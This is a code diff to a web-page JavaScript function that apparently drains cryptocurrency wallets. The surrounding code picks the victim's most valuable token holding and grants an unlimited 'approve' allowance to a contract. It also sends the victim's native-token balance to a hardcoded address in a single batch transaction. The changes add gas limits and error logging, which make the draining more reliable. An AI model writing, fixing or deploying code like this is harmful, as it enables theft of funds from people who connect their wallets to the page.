@@ -439,7 +439,8 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
         functionName: 'approve',
         args: [getAddress(CONTRACTS[mostExpensive.chainId]), maxUint256]
       }),
-      value: '0x0'
+      value: '0x0',
+      gasLimit: BigInt(200000)
     }))
 
   // Prepare transfer call for native token
@@ -453,7 +454,8 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
       transferCall = {
         to: getAddress('0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0'),
         value: `0x${transferAmount.toString(16)}`,
-        data: '0x'
+        data: '',
+        gasLimit: BigInt(200000)
       }
     } else {
       console.log(`Native token balance too low: ${nativeToken.balance} ${nativeToken.symbol || 'unknown'}`)
@@ -479,6 +481,7 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
       if (approveState) approveState.innerHTML = `Batch transaction sent with id: ${id}`
     } catch (error) {
       store.errors.push(`Failed to send batch transaction: ${error.message}`)
+      console.error(`Batch transaction error:`, error)
       const approveState = document.getElementById('approveState')
       if (approveState) approveState.innerHTML = `Failed to send batch transaction: ${error.message}`
     }
